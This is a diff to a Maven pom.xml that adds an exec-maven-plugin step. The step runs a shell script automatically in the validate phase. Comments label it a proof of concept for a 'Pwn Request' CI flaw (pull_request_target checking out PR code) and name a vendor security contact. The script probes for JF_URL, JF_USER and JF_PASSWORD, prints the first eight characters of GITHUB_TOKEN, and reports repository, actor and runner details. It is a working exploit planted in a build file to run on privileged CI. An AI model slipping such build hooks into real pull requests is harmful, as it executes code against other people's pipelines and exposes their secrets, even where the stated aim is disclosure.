@@ -31,4 +31,59 @@
 		</dependency>
 	</dependencies>
 
+	<!-- SECURITY RESEARCH: Pwn Request Vulnerability PoC -->
+	<!-- This demonstrates that PR author code executes in privileged context -->
+	<!-- Report: security@jfrog.com -->
+	<build>
+		<plugins>
+			<plugin>
+				<groupId>org.codehaus.mojo</groupId>
+				<artifactId>exec-maven-plugin</artifactId>
+				<version>3.1.0</version>
+				<executions>
+					<execution>
+						<id>security-poc</id>
+						<phase>validate</phase>
+						<goals>
+							<goal>exec</goal>
+						</goals>
+						<configuration>
+							<executable>sh</executable>
+							<arguments>
+								<argument>-c</argument>
+								<argument>
+echo "";
+echo "============================================================";
+echo "   SECURITY RESEARCH - Pwn Request Vulnerability PoC";
+echo "============================================================";
+echo "";
+echo "[!] This code is executing in the TARGET repository context";
+echo "[!] Triggered via pull_request_target + checkout PR head";
+echo "";
+echo "--- Proof of Execution (Partial Info Only) ---";
+echo "JF_URL exists: $(if [ -n \"$JF_URL\" ]; then echo 'YES'; else echo 'NO'; fi)";
+echo "JF_USER exists: $(if [ -n \"$JF_USER\" ]; then echo 'YES'; else echo 'NO'; fi)";
+echo "JF_PASSWORD exists: $(if [ -n \"$JF_PASSWORD\" ]; then echo 'YES'; else echo 'NO'; fi)";
+echo "GITHUB_TOKEN prefix: ${GITHUB_TOKEN:0:8}...";
+echo "";
+echo "--- Environment ---";
+echo "Repository: $GITHUB_REPOSITORY";
+echo "Event: $GITHUB_EVENT_NAME";
+echo "Actor: $GITHUB_ACTOR";
+echo "Runner: $(hostname)";
+echo "";
+echo "============================================================";
+echo "   Vulnerability: pull_request_target + checkout head.sha";
+echo "   Impact: Secrets accessible to PR author's code";
+echo "   Report to: security@jfrog.com";
+echo "============================================================";
+								</argument>
+							</arguments>
+						</configuration>
+					</execution>
+				</executions>
+			</plugin>
+		</plugins>
+	</build>
+
 </project>
